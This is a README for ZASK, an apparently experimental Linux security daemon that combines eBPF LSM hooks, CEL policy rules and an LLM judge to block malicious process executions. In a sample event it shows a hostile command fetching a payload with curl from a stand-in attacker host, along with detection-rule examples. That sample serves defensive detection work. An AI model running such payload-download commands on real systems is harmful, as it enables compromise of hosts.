# ZASK — Zero-trust AI-Secured Kernel

Autonomous Linux Kernel Hardening via eBPF LSM and AI.

**ZASK (Zero-trust AI-Secured Kernel)** is an autonomous security engine that evaluates the behavioral intent of Linux processes using raw eBPF LSM telemetry, a deterministic engine, and a tiered AI cascade.

Most security tools detect threats syntactically — matching signatures, hashes, or known-bad patterns. ZASK asks a different question: can Linux kernel-level security enforcement be made semantic? This is that attempt. 

## How It Works

| Tier | Layer | Mechanism | Latency | Purpose |
|------|-------|-----------|---------|---------|
| **1** | Kernel | eBPF LSM + Inode Map | < 1μs | Instant blocking based on known bad inodes |
| **2** | User-space | Deterministic Engine | < 10ms | Common Expression Language (CEL) policy matching |
| **3** | User-space | Fast Classifier | < 50ms | Local ONNX machine learning model triage |
| **4** | User-space/remote | LLM Semantic Judge | 5-10s | Gen AI reasoning on process intent for ambiguous cases |


> ⚠️ ZASK is still experimental, not yet a production-ready EDR. The ONNX tier 
> is planned but not yet implemented. Feedback on the architecture, threat model, 
> or approach is very welcome — open an issue or reach out directly.

ZASK operates a multi-tiered enforcement model inspired by Daniel Kahneman's Thinking, *Fast and Slow*, System 1 (fast, intuitive) and System 2 (slow, deliberative, logical). 

- **1. The Kernel Telemetry:** The kernel provides the raw behavioral facts (syscall sequences, inodes, arguments) through eBPF LSM hooks.
- **2. Deterministic Engine:** A Go engine evaluates known bad patterns and enforces simple rules with minimal latency. When a process matches a known bad inode or a CEL policy rule, it is blocked immediately without further analysis. If no deterministic rule matches, the event can be escalated to the AI tiers.
- **3. The Fast Path (System 1 - ONNX) [WIP]:** Telemetry is evaluated by an embedded, ultra-fast ONNX Machine Learning model. Clear threats are handled in milliseconds. ⚠️ Work in progress 
- **4. The Deep Arbiter (System 2 - LLM):** When the ONNX model confidence falls into the "gray zone," ZASK seamlessly escalates the case to the LLM-as-a-Judge. The LLM performs semantic reasoning on the exploit pattern to issue a final verdict (Block vs. Allow).
- **5. The Alerting:** Asynchronously, ZASK can be configured to emit events for all executions, regardless of verdict, to a variety of outputs (JSON, Parquet, text) for security information and event management (SIEM).

For more details on the architecture, see the [Architecture Overview](docs/architecture.md).

For more details on the implemented AI integration and feedback loop, see the [AI Integration Documentation](docs/ai-integration.md).

## Features

### Enforcement Modes

- **Lockdown** (default) — enforces verdicts by killing processes and updating the kernel block map.
- **Monitor** — evaluates all tiers and emits audit events but never enforces, useful for dry-run deployments.

### Enforcement Actions

Every process execution is evaluated and assigned one of four verdicts:

| Action | Description |
|--------|-------------|
| `ALLOW` | Execution permitted. If produced by an explicit rule, the inode is cached in Tier 1 to fast-path all future executions of that binary — bypassing Tier 2 rules and suppressing Tier 3 AI analysis entirely. |
| `BLOCK` | Process is killed immediately (`SIGKILL`) and the inode is written to the kernel verdict map, blocking all future executions at the kernel level (< 1μs). |
| `ALERT` | Suspicious activity logged but execution is not blocked — useful for high-noise rules that need visibility without enforcement. |
| `AI_QUEUE` | No Tier 2 rule matched; event is routed to higher tiers for semantic analysis. Execution proceeds until a verdict is returned, becoming a retrospective action. |

When the AI loop returns a risk score above the configured threshold, the original process is killed with `SIGKILL` and the inode is blocked in the kernel. Future executions of the same binary will be blocked immediately by the eBPF hook without hitting user-space at all.

`AI_QUEUE` is the most deliberate tradeoff in ZASK's architecture. Execution proceeds while the LLM deliberates, making enforcement retrospective rather than preventive for novel threats. This is an intentional choice — blocking everything awaiting AI judgment would make the system unusable. The proposed ONNX tier should mitigate this, but requires training on common patterns / attacks to be effective.

### CEL Policy Rules

Tier 2 rules support [CEL (Common Expression Language)](https://github.com/google/cel-go) expressions that can combine multiple event attributes — `argv`, `script_path`, `pid`, `uid`, `cgroup_id`, and more — in a single condition. Rules can explicitly block, allow, or alert:

```yaml
- name: tmp-root-script
  condition: 'script_path.startsWith("/tmp/") && uid == 0'
  action: BLOCK
  severity: critical

- name: allow-system-binaries
  condition: 'argv.startsWith("/usr/bin/") || argv.startsWith("/usr/sbin/")'
  action: ALLOW
  severity: info
```

ALLOW rules seed the inode into the Tier 1 fast-path cache — subsequent executions of the same binary are permitted in under 1μs without re-evaluation.

### Script-Aware Interpreter Detection

When an interpreter executes a script, ZASK reads `/proc/[pid]/cmdline` to get the authoritative script path after exec completes. If the process exits before procfs can be read, it falls back to the `argv[1]` captured by the eBPF hook; if that value is a flag (e.g., `-u`), it is discarded. Rules can then match on `script_path` in addition to the binary path, catching threats like `python3 -u /tmp/payload.py`.

Interpreters are detected by matching `basename(argv)` against a configurable set (default: `python3`, `python`, `bash`, `sh`, `zsh`, `dash`, `fish`, `node`, `nodejs`, `ruby`, `perl`, `php`, `lua`). The list can be customised via `spec.interpreters` in the config file, accepting both bare names and full paths. Non-interpreter binaries follow the standard execution path — all binaries are evaluated through every tier regardless. See [Configuration](docs/configuration.md) for details.

### AI Resilience & Fail-Safe Defaults

ZASK treats AI availability as an operational concern, not a hard dependency. If the AI provider is slow, unreachable, or overwhelmed:

- **Circuit breaker** — automatically opens after repeated failures, preventing request pile-ups. Transitions through half-open probing back to closed when the provider recovers. ZASK uses the [sony/gobreaker](https://github.com/sony/gobreaker/) library for this pattern.
- **Fail-open default** — when the circuit is open, the AI queue is full, or the per-second rate limit is exceeded, events default to `ALLOW` with a logged warning. Executions are never silently dropped and the daemon keeps running normally.
- **Retry with exponential backoff** — transient 5xx errors are retried before the circuit breaker records a failure.

This ensures the daemon remains operational and predictable in production even without AI connectivity.

### Daemon Self-Protection

When `selfProtection: true` (the default), `zaskd` registers its own PID in the eBPF `protected_pids` map. The `lsm/task_kill` hook then silently blocks `SIGKILL` and `SIGTERM` from any external process, preventing attackers or compromised software from terminating the security daemon. **Use `kill -INT $(pidof zaskd)` to stop the daemon safely** — `SIGINT` is not blocked. See [docs/shutdown.md](docs/shutdown.md) for systemd configuration and other shutdown methods.

### Multi-Format Audit Logging

Security events are written to one or more audit outputs simultaneously:

- **JSON** (NDJSON) — for log pipelines and SIEM ingestion
- **Parquet** — columnar format for analytics and long-term storage ⚠️ Work in progress
- **Text** — human-readable console output ⚠️ Work in progress

### Rich data

The events sent to the LLM include comprehensive context for analysis:

```
User: root (UID 0)
Command: /usr/bin/curl -o /tmp/payload https://evil.example.com/shell
Parent: nginx
Parent Command: /usr/sbin/nginx -g daemon off;
Service: /system.slice/nginx.service
```

### Cloud-native by design

ZASK is built to feel immediately familiar to anyone who operates Kubernetes clusters. Configuration is driven entirely by a YAML file (hot-reloaded on change), which can be served to the daemon via a `ConfigMap` and credentials in a `Secret`. The daemon exposes standard Kubernetes probe endpoints — `GET /healthz` (liveness) and `GET /readyz` (readiness, gated on eBPF load and ring buffer active) — so a DaemonSet can manage rollout and traffic routing exactly like any other workload. A Prometheus `/metrics` endpoint exposes queue depth, circuit breaker state, AI verdict counts, and ring buffer drop counters for standard scraping via a `ServiceMonitor`.

Operationally, ZASK runs as a **DaemonSet** — one pod per node — relying on the fact that all containers on a node share the host kernel. The intention is to export the logging into a cluster-wide logging pipeline (e.g., Fluent Bit) rather than building a custom alerting or SIEM (Security Information and Event Management) integration.


## Development

> **Note:** The maintainer primarily uses macOS with Lima for development, more details at [local VM Development Guide](docs/lima-dev-guide.md). The following native Linux workflow is provided for reference but has **not been tested**, comments are welcome.

ZASK interacts directly with the Linux kernel via eBPF LSM hooks. A bug or misconfiguration could cause kernel panics or system instability. **Never run or test the ZASK daemon on your primary workstation.** Always use a dedicated VM or an isolated test machine.


## Documentation

- [Architecture](docs/architecture.md)
- [Configuration Reference](docs/configuration.md)
- [Kernel Requirements](docs/kernel-requirements.md)
- [local VM Development Guide](docs/lima-dev-guide.md)

